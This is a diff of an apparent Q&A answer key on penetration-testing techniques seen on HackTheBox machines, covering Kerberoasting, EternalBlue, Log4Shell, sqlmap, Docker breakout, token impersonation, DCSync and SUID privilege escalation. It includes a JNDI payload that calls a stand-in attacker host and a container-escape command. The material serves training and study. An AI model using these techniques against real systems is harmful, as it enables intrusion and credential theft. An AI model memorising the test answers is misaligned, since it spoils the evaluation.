@@ -44,58 +44,58 @@ Answer: Techniques include secretsdump.py (SAM/NTDS.dit extraction), hashcat/joh
 ## Specific Questions
 
 ---
-**Q6** | AS-REP Roasting
-Machines: htb-absolute, htb-active, htb-anubis, htb-blackfield, htb-bruno, htb-forest, htb-infiltrator, htb-intelligence, htb-jab, htb-mantis, htb-multimaster, htb-office, htb-outdated, htb-pivotapi, htb-rebound, htb-sauna, htb-support, htb-tentacle
-Answer: AS-REP Roasting targets accounts with Kerberos pre-authentication disabled (DONT_REQ_PREAUTH). An attacker requests an AS-REP without credentials, receives a response encrypted with the user's password hash, then cracks it offline with hashcat (mode 18200) or john. Tools: GetNPUsers.py (Impacket), kerbrute, Rubeus.
+**Q6** | Kerberoasting in Active Directory
+Machines: htb-absolute, htb-active, htb-administrator, htb-blackfield, htb-blazorized, htb-breach, htb-certified, htb-delegate, htb-escape, htb-fluffy, htb-forest, htb-hathor, htb-intelligence, htb-jab, htb-lustroustwo, htb-mirage, htb-object, htb-pivotapi, htb-puppy, htb-rebound, htb-sauna, htb-scrambled, htb-search, htb-sizzle, htb-tombwatcher, htb-vintage, htb-voleur
+Answer: Kerberoasting targets Active Directory service accounts configured with Service Principal Names (SPNs). An authenticated domain user requests a Kerberos TGS ticket for the target SPN from the Domain Controller. The ticket is encrypted with the service account's NTLM password hash. The attacker extracts the ticket offline and cracks the password hash using hashcat (mode 13100) or john. Common tools include GetUserSPNs.py (Impacket), Rubeus, and Invoke-Kerberoast.
 
 ---
 
 ---
-**Q7** | certipy usage
-Machines: htb-absolute, htb-authority, htb-certified, htb-coder, htb-darkcorp, htb-darkzero, htb-escape, htb-escapetwo, htb-fluffy, htb-haze, htb-infiltrator, htb-manager, htb-mirage, htb-mist, htb-rebound, htb-retro, htb-scepter, htb-sendai, htb-shibuya, htb-tombwatcher, htb-vulncicada
-Answer: Certipy is used for: enumerating vulnerable ADCS templates (certipy find), requesting certificates for privilege escalation (certipy req), authenticating with obtained certificates (certipy auth), creating Shadow Credentials (certipy shadow auto), and exploiting ESC1/ESC4/ESC7/ESC8/ESC9 vulnerabilities.
+**Q7** | MS17-010 EternalBlue exploitation
+Machines: htb-blue, htb-legacy
+Answer: MS17-010 (CVE-2017-0143 / EternalBlue) is a critical remote code execution vulnerability in the SMBv1 protocol in Windows. It allows unauthenticated attackers to execute arbitrary shellcode in kernel space over SMB port 445, granting immediate NT AUTHORITY\SYSTEM access. Common tools and exploit modules include Metasploit (exploit/windows/smb/ms17_010_eternalblue) and standalone Python exploits (e.g. zzz_exploit.py / checker.py). Demonstrated on Blue and Legacy.
 
 ---
 
 ---
-**Q8** | CVE-2026-4480
-Machines: htb-abducted
-Answer: CVE-2026-4480 is demonstrated on the Abducted machine. Specific exploitation details should be found in the htb-abducted.md writeup.
+**Q8** | CVE-2021-44228 Log4Shell RCE
+Machines: htb-crafty, htb-logforge
+Answer: CVE-2021-44228 (Log4Shell) is an unauthenticated Remote Code Execution flaw in the Apache Log4j library resulting from improper validation of JNDI lookups (e.g. ${jndi:ldap://attacker:1389/Exploit}). Attackers trigger the lookup by injecting malicious strings into HTTP headers, chat messages, or input fields. A rogue LDAP or RMI referral server (such as marshalsec or JNDIExploit) serves a payload class which the vulnerable host deserializes and executes. Demonstrated on Crafty and Logforge.
 
 ---
 
 ---
-**Q9** | WriteOwner abuse
-Machines: htb-anubis, htb-babytwo, htb-certified, htb-darkzero, htb-escape, htb-escapetwo, htb-haze, htb-mist, htb-object, htb-querier, htb-reel, htb-signed, htb-streamio, htb-tombwatcher
-Answer: WriteOwner allows an attacker to change the owner of an AD object to themselves, then modify the DACL to grant full control (GenericAll/WriteDACL). This enables password resets, adding users to groups, or extracting credentials. Tools: PowerView (Set-DomainObjectOwner, Add-DomainObjectAcl), bloodyAD, Impacket owneredit/dacledit.
+**Q9** | SQL injection with sqlmap
+Machines: htb-cache, htb-catch, htb-enterprise, htb-europa, htb-faculty, htb-falafel, htb-giddy, htb-health, htb-jarvis, htb-metatwo, htb-nodeblog, htb-proper, htb-shared, htb-streamio, htb-trick
+Answer: sqlmap is an automated tool used to detect and exploit SQL injection vulnerabilities in web applications. On HTB machines, it is leveraged to enumerate databases (--dbs), dump sensitive tables and user credential hashes (--dump), test stacked queries or time-based blind SQLi, read arbitrary files (--file-read), or achieve remote OS command execution (--os-shell). Demonstrated on Jarvis, Europa, Falafel, Cache, Shared, and Faculty.
 
 ---
 
 ---
-**Q10** | ESC9 ADCS attack
-Machines: htb-certified, htb-scepter
-Answer: ESC9 exploits GenericWrite on a user to modify their userPrincipalName (UPN) to match a privileged account. The attacker then requests a certificate with the spoofed UPN and authenticates as the target. Steps: 1) Modify target's UPN to administrator, 2) Request certificate via certipy req, 3) Revert UPN, 4) Authenticate with certipy auth using the certificate. Certipy is the primary tool.
+**Q10** | Docker container breakout
+Machines: htb-carpediem, htb-corporate, htb-data, htb-extension, htb-feline, htb-intuition, htb-laboratory, htb-magicgardens, htb-monitors, htb-monitorstwo, htb-pikatwoo, htb-runner, htb-sorcery, htb-stacked, htb-talkative
+Answer: Docker breakout techniques on HTB include: 1) Abusing exposed or mounted Docker sockets (/var/run/docker.sock) to spawn a new privileged container mounting the host's root directory (docker run -v /:/host -it alpine chroot /host); 2) Exploiting containers run with --privileged by mounting host disk devices or using cgroups release_agent execution (CVE-2022-0492 on Carpediem); 3) Exploiting container runtime vulnerabilities like runc (CVE-2024-21626 on Runner, cr8escape on Pikatwoo); and 4) Abusing membership in the local docker group on the host.
 
 ---
 
 ---
-**Q11** | BloodHound attack paths
-Machines: htb-absolute, htb-administrator, htb-axlle, htb-babytwo, htb-blackfield, htb-blazorized, htb-breach, htb-certified, htb-coder, htb-cypher, htb-darkcorp, htb-darkzero, htb-delegate, htb-eighteen, htb-escape, htb-escapetwo, htb-fluffy, htb-forest, htb-freelancer, htb-ghost, htb-haze, htb-infiltrator, htb-intelligence, htb-jab, htb-lustroustwo, htb-manager, htb-mirage, htb-mist, htb-multimaster, htb-nanocorp, htb-object, htb-outdated, htb-phantom, htb-pivotapi, htb-puppy, htb-rebound, htb-redelegate, htb-reel, htb-retrotwo, htb-rustykey, htb-sauna, htb-scepter, htb-search, htb-sendai, htb-shibuya, htb-sizzle, htb-streamio, htb-support, htb-tombwatcher, htb-university, htb-vintage, htb-voleur
-Answer: BloodHound identifies shortest paths to Domain Admin, dangerous ACL permissions (GenericAll, WriteDACL, WriteOwner, ForceChangePassword), Kerberoastable/AS-REP Roastable accounts, constrained/unconstrained delegation, group membership chains, and ADCS attack paths. Data collected via SharpHound/bloodhound-python.
+**Q11** | Token impersonation via JuicyPotato / PrintSpoofer
+Machines: htb-bruno, htb-cereal, htb-conceal, htb-fighter, htb-json, htb-mirage, htb-perspective, htb-pivotapi, htb-rebound, htb-scrambled, htb-shibuya, htb-tally, htb-worker
+Answer: Windows service accounts (such as IIS APPPOOL or LOCAL SERVICE) often possess SeImpersonatePrivilege. Attackers abuse this by tricking a high-privileged account (such as NT AUTHORITY\SYSTEM) into authenticating to a local rogue RPC/COM server. JuicyPotato coerces authentication via DCOM using specific CLSIDs, while PrintSpoofer coerces authentication via the named pipe of the Print Spooler service (\\.\pipe\spoolss). Once the SYSTEM token is captured, the exploit calls CreateProcessWithTokenW to spawn a shell with elevated SYSTEM privileges.
 
 ---
 
 ---
-**Q12** | Shadow Credentials attack
-Machines: htb-absolute, htb-certified, htb-darkcorp, htb-delegate, htb-escapetwo, htb-fluffy, htb-haze, htb-infiltrator, htb-mist, htb-outdated, htb-puppy, htb-rebound, htb-tombwatcher
-Answer: Shadow Credentials attack adds a Key Credential to a target's msDS-KeyCredentialLink attribute. The attacker generates a certificate pair, writes the public key to the attribute, then uses the private key to request a TGT via PKINIT. Tools: certipy shadow auto, pywhisker, whisker. Requires GenericWrite/GenericAll on the target object.
+**Q12** | DCSync attack
+Machines: htb-administrator, htb-blazorized, htb-darkcorp, htb-delegate, htb-forest, htb-ghost, htb-hathor, htb-mirage, htb-mist, htb-phantom, htb-retrotwo, htb-rustykey, htb-sauna, htb-scepter, htb-signed, htb-sizzle, htb-university, htb-vintage
+Answer: DCSync mimics the behavior of an Active Directory Domain Controller using the Directory Replication Service (DRS) Remote Protocol (MS-DRSR). By requesting replication of user objects via GetNCChanges, an attacker with replication permissions (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All) can dump the password hashes of any domain account—including the krbtgt account and Domain Admins—from NTDS.dit without running code on the DC itself. Executed using Impacket's secretsdump.py -just-dc or Mimikatz lsadump::dcsync.
 
 ---
 
 ---
-**Q13** | Samba RCE
-Machines: htb-lame, htb-frolic, htb-node, htb-kotarak, htb-brainfuck, htb-falafel, htb-lazy, htb-sneaky, htb-zipper, htb-writer, htb-ypuffy, htb-gofer, htb-overgraph, htb-bamboo, htb-calamity, htb-jail, htb-ropetwo, htb-sekhmet, htb-smasher2, htb-traceback, htb-zetta, htb-tenten, htb-sniper, htb-puppy, htb-abducted
-Answer: Samba RCE exploits include CVE-2007-2447 (Samba 3.0.20 username map script command injection, exploited on Lame via Metasploit), CVE-2017-7494 (SambaCry - writable share to load malicious shared library), and misconfigured SMB shares allowing credential theft or file upload for code execution.
+**Q13** | SUID binaries and GTFOBins Linux privesc
+Machines: htb-academy, htb-awkward, htb-chaos, htb-conversor, htb-cozyhosting, htb-devvortex, htb-dump, htb-earlyaccess, htb-facts, htb-flujab, htb-jail, htb-jarvis, htb-jewel, htb-joker, htb-knife, htb-luanne, htb-mango, htb-meta, htb-monitorstwo, htb-nunchucks, htb-openadmin, htb-paper, htb-schooled, htb-shoppy, htb-sunday, htb-traverxec, htb-unrested, htb-updown, htb-writer, htb-zero
+Answer: SUID (Set Owner User ID up on execution) binaries run with the permissions of the file owner (typically root). Attackers enumerate them via find / -perm -4000 -type f 2>/dev/null. If a binary is misconfigured, vulnerable, or listed on GTFOBins (such as bash, nmap, vim, python, find, cp, systemctl, or custom SUID binaries), attackers exploit built-in functionality (e.g. shell escapes, arbitrary file read/write, shared library loading) to escalate privileges to root.
 
 ---
 
@@ -107,8 +107,9 @@ Answer: Evil-WinRM is used for remote PowerShell shell access over WinRM (port 5
 ---
 
 ---
-**Q15** | GenericAll abuse
-Machines: htb-administrator, htb-babytwo, htb-certified, htb-darkzero, htb-escapetwo, htb-fluffy, htb-forest, htb-haze, htb-infiltrator, htb-puppy, htb-rebound, htb-redelegate, htb-scepter, htb-search, htb-sendai, htb-signed, htb-support, htb-tombwatcher, htb-university, htb-vintage
-Answer: GenericAll grants full control over an AD object. Abuse methods: force password reset (net rpc password), add Shadow Credentials, modify group membership, set SPN for Kerberoasting, write to msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD, or modify DACL. Tools: PowerView, bloodyAD, net rpc, certipy.
+**Q15** | Samba RCE
+Machines: htb-abducted, htb-bamboo, htb-brainfuck, htb-calamity, htb-falafel, htb-frolic, htb-gofer, htb-jail, htb-kotarak, htb-lame, htb-lazy, htb-node, htb-overgraph, htb-puppy, htb-ropetwo, htb-sekhmet, htb-smasher2, htb-sneaky, htb-sniper, htb-tenten, htb-traceback, htb-writer, htb-ypuffy, htb-zetta, htb-zipper
+Answer: Samba RCE exploits include CVE-2007-2447 (Samba 3.0.20 username map script command injection, exploited on Lame via Metasploit), CVE-2017-7494 (SambaCry - writable share to load malicious shared library), and misconfigured SMB shares allowing credential theft or file upload for code execution.
 
 ---
+
